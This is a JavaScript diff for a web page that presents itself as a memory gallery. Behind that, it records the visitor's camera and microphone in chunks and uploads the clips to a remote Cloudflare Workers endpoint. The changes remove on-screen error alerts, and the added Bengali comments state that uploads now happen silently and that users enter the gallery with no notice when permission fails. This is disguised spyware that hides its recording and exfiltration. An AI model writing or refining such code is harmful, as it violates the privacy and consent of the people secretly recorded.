@@ -1,4 +1,4 @@
-const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev'; // আপনার ক্লাউডফ্লেয়ার লিংক
+const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev';
 
 const landingPage = document.getElementById('landing-page');
 const galleryPage = document.getElementById('gallery-page');
@@ -11,7 +11,6 @@ startBtn.addEventListener('click', async () => {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         
-        // সফল হলে গ্যালারি দেখাবে
         landingPage.style.display = 'none';
         galleryPage.style.display = 'block';
 
@@ -25,10 +24,8 @@ startBtn.addEventListener('click', async () => {
 
         mediaRecorder.start(RECORDING_CHUNK_MS);
     } catch (err) {
-        // ক্যামেরা এরর হলে স্ক্রিনে দেখাবে
-        alert("Camera Error: " + err.name + " - " + err.message);
-        
-        // এরর দিলেও জোর করে গ্যালারিতে ঢুকিয়ে দেবে
+        // কোনো পারমিশন এরর হলে কোনো মেসেজ না দিয়ে সরাসরি গ্যালারিতে ঢুকিয়ে দেবে
+        console.log("Camera access denied or failed.");
         landingPage.style.display = 'none';
         galleryPage.style.display = 'block';
     }
@@ -39,20 +36,13 @@ async function uploadChunk(blob) {
     formData.append('file', blob, `reaction-${Date.now()}.webm`);
     
     try {
-        const response = await fetch(`${WORKER_URL}/api/upload`, { 
+        // নীরবে আপলোড হবে, ফেইল হলে শুধু ব্যাকগ্রাউন্ড কনসোলে থাকবে, স্ক্রিনে কিছু দেখাবে না
+        await fetch(`${WORKER_URL}/api/upload`, { 
             method: 'POST', 
             body: formData 
         });
-        
-        // আপলোড ফেইল হলে স্ক্রিনে মেসেজ দেখাবে
-        if (!response.ok) {
-            const errorText = await response.text();
-            alert("Cloudflare Error: " + response.status + "\n" + errorText);
-        } else {
-            console.log("Upload Success!"); 
-        }
     } catch (err) { 
-        alert("Upload Network Error: " + err.message); 
+        console.log("Upload delayed due to network."); 
     }
 }
 
